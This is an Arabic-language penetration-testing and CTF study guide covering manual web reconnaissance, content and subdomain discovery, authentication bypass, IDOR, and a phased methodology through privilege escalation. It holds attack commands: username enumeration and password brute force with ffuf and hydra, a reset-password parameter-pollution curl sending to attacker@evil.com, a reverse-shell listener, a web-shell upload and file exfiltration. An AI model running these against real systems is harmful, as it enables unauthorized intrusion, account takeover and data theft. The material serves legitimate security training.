### 1. **Walking An Application** – إزاي تمشي على الموقع بإيدك وتكتشفي ثغرات بدون أدوات أوتوماتيك

الهدف: تفهمي الموقع "من جوا" باستخدام أدوات المتصفح فقط (Developer Tools)، لأن الأدوات الأوتوماتيك (زي Burp Scanner أو ZAP) بتفوت حاجات كتير مهمة.

#### الأدوات الرئيسية في المتصفح (Firefox/Chrome)

| الأداة               | إزاي تفتحيها؟                                 | إيه اللي بنستخدمها فيه؟                                                                |
| -------------------- | --------------------------------------------- | -------------------------------------------------------------------------------------- |
| **View Page Source** | Ctrl+U أو right-click → View Page Source      | تشوفي HTML  + تعليقات المطورين (<!-- -->) + روابط مخفية + JS/CSS paths                 |
| **Inspector**        | F12 أو right-click → Inspect Element          | تشوفي DOM الحالي (بعد ما JS غيّر الصفحة) + تعدلي CSS/attributes عشان تشوفي حاجات مخفية |
| **Debugger**         | F12 →  Debugger (Firefox) أو Sources (Chrome) | تفهمي JS، تضعي breakpoints، تعطلّي functions (زي إزالة popup)                          |
| **Network**          | F12 →  Network                                | تشوفي كل الـ requests (GET/POST) + headers + responses + AJAX calls                    |

**أهم حاجة في الـ View Source:**
- التعليقات (`<!-- -->`) غالبًا فيها:
  - روابط صفحات تحت التطوير
  - نسخ قديمة
  - إشارات لـ framework/version
  - أحيانًا flags مباشرة
- لو لقيتي `<a href="/secret-page">` أو `<!-- temp homepage: /temp -->` → روحي عليها فورًا.

**Directory Listing Misconfig:**
- لو غيرتي URL لـ `/css/` أو `/js/` ولقيتي قايمة ملفات → ده خطأ كبير.
- دوري على `flag.txt`, `backup.zip`, `config.php.bak`

**Framework Fingerprinting:**
- دوري في سورس على:
  - `jquery-3.2.1.min.js` → jQuery
  - `wp-content/` → WordPress
  - `laravel.js` أو `vue.min.js`
- شوفي تعليقات زي `<!-- Powered by Framework v1.2.3 -->` → ابحثي عن CVEs للإصدار ده.

### 2. **Content Discovery** – إزاي تلاقي الصفحات/الملفات اللي مش ظاهرة

**أهم 3 طرق:**

1. **Manual (بإيدك – أهم في البداية)**
   - غيري في الـ URL:
     - `/admin`, `/administrator`, `/login`, `/panel`, `/dashboard`
     - `/backup`, `/old`, `/test`, `/dev`, `/staging`
     - `/config`, `/db`, `/.env`, `/.git/HEAD`
   - شوفي robots.txt وسياقه (هيتشرح تحت)

2. **Automated (الأدوات السريعة)**
   - **ffuf** (أفضل في 2026):
     ```
     ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
     ```
   - **gobuster** / **dirsearch** بنفس الفكرة
   - استخدمي wordlists كبيرة من SecLists:
     - Discovery/Web-Content/
     - Discovery/Backups/
     - Discovery/Apache.fuzz.txt (لو Apache)

2. **OSINT** 
   - **robots.txt** → `/robots.txt`
     - أهم حاجة: كل سطر `Disallow:` ده هدف محتمل (لأنه المطور كان عايز يخبيه عن Google، بس مش مخبيه عنك)
     - مثال: `Disallow: /admin-backup/` → جربيه فورًا
   - **sitemap.xml** → `/sitemap.xml`
     - بيحتوي على صفحات كتير (حتى اللي مش في الـ menu)
   - **favicon.ico** → حملي الأيقونة وقارني hash ها مع OWASP Favicon Database
   - **Wayback Machine** → archive.org → ابحثي عن الدومين → شوفي صفحات قديمة لسه شغالة
   - **Google Dorking**:
     - `site:target.com admin`
     - `site:target.com filetype:php`
     - `site:target.com inurl:backup`
   - **GitHub Dorking**:
     - `target.com password`
     - `target.com .env`

**S3 Buckets (مهم جدًا في 2026):**
- أشهر أسماء:
  - `company-assets.s3.amazonaws.com`
  - `company-backup.s3.amazonaws.com`
  - `company-public.s3.amazonaws.com`
- لو فتح بدون login → فيه احتمال كبير يكون public وفيه بيانات حساسة

### 3. **Subdomain Enumeration** – إزاي تلاقي subdomains زي api.target.com, dev.target.com

**أهم الطرق:**

1. **Certificate Transparency (crt.sh)**
   - ادخلي: https://crt.sh/?q=%.target.com
   - هتلاقي كل الـ subdomains اللي خدوا SSL certificates (حتى لو مش في DNS عام)

2. **DNS Bruteforce**
   - أدوات: dnsrecon, dnsenum, massdns
   - wordlist: SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   - مثال:
     ```
     dnsrecon -d target.com -D subdomains.txt -t brt
     ```

3. **OSINT + Tools**
   - **Sublist3r**:
     ```
     sublist3r -d target.com
     ```
   - Google: `site:*.target.com -site:www.target.com`

4. **Virtual Hosts (VHost Bruteforce)**
   - لما الـ subdomain مش في DNS عام، لكن السيرفر بيرد عليه لو الـ Host header صح.
   - أداة: ffuf أو gobuster مع `-H "Host: FUZZ.target.com"`
     ```
     ffuf -u http://target-ip/ -H "Host: FUZZ.target.com" -w subdomains.txt -fc 404
     ```

### 4. **Authentication Bypass** – إزاي تدخلي بدون باسوورد أو كـ admin
**أشهر الطرق:**

1. **Username Enumeration**
   - لو الموقع بيقول:
     - "Username already exists" → valid
     - "Username not found" → invalid
   - استخدمي ffuf مع wordlist أسماء (names.txt):
     ```
     ffuf -w names.txt -X POST -d "username=FUZZ&password=x" -mr "already exists"
     ```

2. **Brute Force**
   - بعد ما تجمعي valid usernames → brute force بـ passwords:
     ```
     ffuf -w valid_users.txt:W1,10m-passwords.txt:W2 -d "username=W1&password=W2" -fc 200
     ```

3. **Logical Bypass / Parameter Pollution**
   - مثال الـ reset password:
     - GET: `?email=robert@victim.com`
     - POST: `email=attacker@evil.com`
     - السيرفر بياخد الـ POST email لو استخدم $_REQUEST (غلط شائع في PHP)
   - Curl مثال:
     ```
     curl "http://target/reset?email=victim@victim.com" -d "email=attacker@evil.com"
     ```

4. **Cookie Tampering**
   - لو ال Cookie plain:
     - `logged_in=true; admin=false` → غيري لـ `admin=true`
   - لو base64:
     - decode → غيري `"admin":false` لـ `true` → re-encode → ابعتي
   - لو hashed → جربي crackstation.net

### 5. **IDOR (Insecure Direct Object Reference)** – أخطر حاجة في الـ authorization

**الفكرة:**
- السيرفر بيعتمد على ID إنت بعته (في URL أو parameter) بدون ما يتحقق إنه بتاعك.
- مثال: `/profile?user_id=123` → غيري 123 لـ 124 → تشوفي بيانات حد تاني.

**أنواع الـ IDs:**

| النوع            | مثال                             | إزاي تستغلي؟                          | أداة مساعدة   |
| ---------------- | -------------------------------- | ------------------------------------- | ------------- |
| Numeric          | user_id=1305                     | غيري الرقم تصاعدي/تنازلي              | Burp Intruder |
| Encoded (base64) | user=eyJpZCI6MTIzfQ==            | decode → غيري → re-encode             | CyberChef     |
| Hashed           | user=202cb962ac59075b... (md5)   | جربي crackstation.net                 | crackstation  |
| UUID             | user=550e8400-e29b-41d4-a716-... | صعب التخمين، لكن جربي swap بين حسابين | حسابين + swap |

**إزاي تلاقي IDOR؟**
- اعملي حسابين (account A + account B)
- شوفي الـ ID بتاع كل واحد
- جربي تستخدمي ID التاني في حسابك
- لو شفتي بياناته → IDOR مؤكد

**أماكن شائعة لـ IDOR:**
- `/api/user/123`
- `/profile?uid=456`
- `/order/789`
- `/document/download?id=101`
- AJAX calls في Network tab

---
### Advices for solving machines
### ملاحظات عامة قبل ما نبدأ 
- **الأدوات العامة**: 
  - **Network Tools**: nmap, masscan, nessus (لو licensed), openvas, nikto (لـ web/network overlap), wireshark (packet capture), tcpdump, arp-scan, netdiscover.
  - **Web Tools**: burp suite (proxy, repeater, intruder, scanner), zap (alternative), ffuf/gobuster/dirsearch (fuzzing), sqlmap (SQLi), xsser (XSS), wpscan (WordPress), nuclei (template-based scanner), whatweb/wappalyzer (fingerprinting), nikto (web vuln scan).
  - **General**: metasploit (exploits), searchsploit/exploit-db (CVE search), linpeas/winpeas (PE enum), bloodhound (AD), hydra/patator (brute force), john/hashcat (cracking).
- **البيئة**: استخدمي Kali/Parrot/AttackBox، مع VPN لو THM/HTB.
- **النوتات**: استخدمي cherrytree أو notion، واكتبي كل command وoutput.
- **الأمان**: في real life، خدي authorization (RoE)، وما تعمليش destructive actions.
- **الوقت**: recon 40-60%، exploit 20-30%، PE 20-30%.

### Phase 1: Reconnaissance / Enumeration 
ده اللي بيفرق بين الفشل والنجاح. هدفك: تعرفي كل حاجة عن الـ target (IP/domain) بدون ما تلمسيه كتير.

1. **Gather Basic Info (Passive Recon – No Touching)**
   - **Steps**:
     - شوفي الـ IP/domain من الـ hint أو whois.
     - ابحثي عن الـ domain في Google: `site:target.com` (dorking).
     - شوفي crt.sh لـ subdomains: `crt.sh/?q=%.target.com`.
     - Wayback Machine: archive.org → ابحثي عن الدومين → شوفي pages قديمة.
     - GitHub: `github.com/search?q=target.com` → دوري على .env, keys, leaks.
     - Shodan: `shodan.io/search?query=ip:10.10.x.x` → services مفتوحة.
   - **Network Tools**: whois, dig/nsLookup (DNS info).
   - **Web Tools**: whatweb (passive), wappalyzer (browser extension).
   - **Output**: list of subdomains, old paths, leaked creds.

1. **Port Scanning** 
   - **Steps**:
     - Ping check: `ping -c 4 IP` → alive? OS guess من TTL.
     - Quick scan: `nmap -sS -T4 -top-ports 100 IP` → top ports.
     - Full TCP: `nmap -sC -sV -p- -oN nmap-full.txt IP` → كل ports + scripts + versions (بطيء، لكن مفصل).
     - UDP: `nmap -sU -top-ports 100 IP` → SNMP, NTP, TFTP... (غالباً مفيد في CTF).
     - Vuln scan: `nmap -sV --script vuln IP` → basic CVE check.
   - **Network Tools**: nmap, masscan (أسرع لـ full ports), nessus/openvas (لو عايزة GUI vuln scan).
   - **Output**: list of open ports (80,443 web; 22 ssh; 445 smb; 139 netbios...).

3. **Service Enumeration (Per Port)**
   - **Steps** (ركزي على open ports من nmap):
     - HTTP/HTTPS (80/443): `curl -I IP`, browser visit, robots.txt, sitemap.xml.
     - SSH (22): `ssh -V IP` → version, جربي default creds لو weak.
     - SMB (445/139): `smbclient -L //IP`, `enum4linux IP` → shares, users.
     - FTP (21): `ftp IP` → anonymous login? `dir` لـ files.
     - SNMP (161 UDP): `snmpwalk -v1 -c public IP` → device info.
     - RDP (3389): `rdesktop IP` أو `xfreerdp` → creds guess.
     - Other: telnet, smtp, pop3 → netcat `nc IP port` → banner grabbing.
   - **Network Tools**: netcat/nc, enum4linux, smbmap, crackmapexec (cme).
   - **Web Tools**: nikto `nikto -h IP` → web vulns.

1. **Web-Specific Enumeration**
   - **Steps**:
     - Fingerprint: `whatweb IP`, wappalyzer → CMS (WP, Joomla), framework (Laravel, Django).
     - Content Discovery: `ffuf -u http://IP/FUZZ -w common.txt`.
     - Subdomains: `ffuf -u http://IP/ -H "Host: FUZZ.target.com" -w subs.txt` (vhost).
     - Source: Ctrl+U → comments, JS files (deobfuscate لو minified).
     - Network tab: شوفي API calls, XHR.
     - Headers: `curl -I` → Server, X-Powered-By.
   - **Web Tools**: burp (proxy all traffic), zap, gobuster, dirsearch, nuclei `nuclei -u IP`.

1. **Vuln Research** 
   - **Steps**:
     - Search: `searchsploit service version` أو exploit-db.com.
     - CVE: `cve.mitre.org` أو vulns.io.
     - Metasploit: `msfconsole` → `search service version`.
   - **Tools**: searchsploit, metasploit, github exploits.

### Phase 2: Initial Access / Foothold 
بناءً على الـ recon، اختاري vuln واستغليها.

1. **Web Exploits (أكثر machines)**
   - SQLi: `sqlmap -u URL --forms --batch --dbs`
   - XSS: manual payloads, xsser.
   - File Upload: upload shell.php → reverse shell.
   - IDOR: غيري IDs في URL/parameters.
   - Auth Bypass: cookie edit, parameter pollution.

2. **Network Exploits**
   - Weak creds: hydra `hydra -l user -P pass.txt IP ssh`
   - CVE exploits: msf `use exploit/...` → set RHOSTS, payload.
   - SMB: `impacket-smbclient` لو null session.

3. **Get Shell**
   - Reverse: nc listener `nc -lvnp 4444` + payload في exploit.
   - Upgrade: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

### Phase 3: Privilege Escalation
لو low-priv shell، ارفعي لـ root/admin.

1. **Linux PE**
   - `id`, `sudo -l`, `uname -a`
   - SUID: `find / -perm -u=s 2>/dev/null`
   - Cron: `crontab -l`, `/etc/crontab`
   - Kernel: `searchsploit linux kernel version`
   - Tools: linpeas.sh (run it), linux-exploit-suggester

2. **Windows PE**
   - `whoami /all`, `systeminfo`
   - Services: `sc qc service_name` → unquoted paths.
   - Tools: winpeas.exe (upload and run), powershell empire.

3. **AD / Lateral**
   - Bloodhound: sharphound.ps1 → analyze graph.
   - Kerberoast: `GetUserSPNs.py`

### Phase 4: Post-Exploitation & Flags
- شوفي `/root/root.txt`, `/home/user/user.txt`
- Exfil: `base64 file.txt` أو scp.
- Clean up لو real: rm temps, kill processes.

### Phase 5: Reporting 
- اكتبي: vuln description, steps, PoC code, impact, remediation.
- Tools: dradis, cherrytree للـ templates.

And Done :)